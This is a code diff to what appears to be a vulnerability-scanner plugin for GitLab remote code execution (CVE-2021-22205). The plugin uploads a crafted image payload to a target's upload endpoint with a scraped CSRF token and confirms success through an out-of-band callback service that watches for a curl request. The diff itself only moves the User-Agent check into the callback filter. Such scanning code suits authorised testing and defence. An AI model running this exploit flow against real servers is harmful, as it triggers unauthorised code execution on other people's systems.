@@ -31,14 +31,9 @@ class Plugin(BasePlugin):
         file = [('file', ('test.jpg', payload, 'image/jpeg'))]
         csrf_resp = session.get(f"{target}/users/sign_in", headers={"Origin": target})
         csrf = CSRF_PATTERN.search(csrf_resp.content).group(1).decode()
-        rev_token = reverse.request_code("")
+        rev_token = reverse.request_code('headers["User-Agent"].contains("curl")')
         session.post(f'{target}/uploads/user', files=file, headers={"X-CSRF-Token": csrf})
         rev_resp = reverse.check(rev_token)
-        ua_curl = False
-        for i in rev_resp["requests"]:
-            if "User-Agent: curl" in i:
-                ua_curl = True
-                break
-        if rev_resp["requested"] and ua_curl:
+        if rev_resp["requested"]:
             self.logger.success("CVE-2021-22205 {}".format(target))
             return "Gitlab rce https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md"
